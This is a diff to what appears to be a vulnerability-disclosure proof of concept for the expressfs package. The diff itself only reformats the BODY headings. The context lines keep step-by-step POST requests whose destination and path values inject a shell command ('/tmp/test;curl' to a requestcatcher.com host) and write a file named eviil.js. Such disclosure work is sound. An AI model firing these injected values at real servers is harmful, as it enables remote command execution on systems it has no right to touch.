@@ -16,10 +16,11 @@
 
 2. launch this `POST` request from postman http://localhost:8000/expressfs.cp
     
-    BODY:
-      | KEY | VALUE |
-      | --- | --- |
-      | destination | /tmp/test;curl https://shieldfy.requestcatcher.com/hacked-expressfs.cp |
+     - BODY
+
+        | KEY | VALUE |
+        | --- | --- |
+        | destination | /tmp/test;curl https://shieldfy.requestcatcher.com/hacked-expressfs.cp |
 
 3. CHECK the requestcatcher tab in the browser you will see the result of command injection attack
 
@@ -33,7 +34,8 @@
 
 2. launch this `POST` request from postman http://localhost:8000/expressfs.rmdir
     
-    BODY:
+    - BODY
+    
       | KEY | VALUE |
       | --- | --- |
       | path | /tmp/test;curl https://shieldfy.requestcatcher.com/hacked-expressfs.rmdir |
@@ -50,7 +52,8 @@
 
 2. launch this `POST` request from postman http://localhost:8000/expressfs.create
     
-    BODY:
+    - BODY
+    
       | KEY | VALUE |
       | --- | --- |
       | path | ./eviil.js |
@@ -68,7 +71,8 @@
 
 2. launch this `POST` request from postman http://localhost:8000/expressfs.appendFile
     
-    BODY:
+    - BODY
+    
       | KEY | VALUE |
       | --- | --- |
       | path | ./eviil.js |
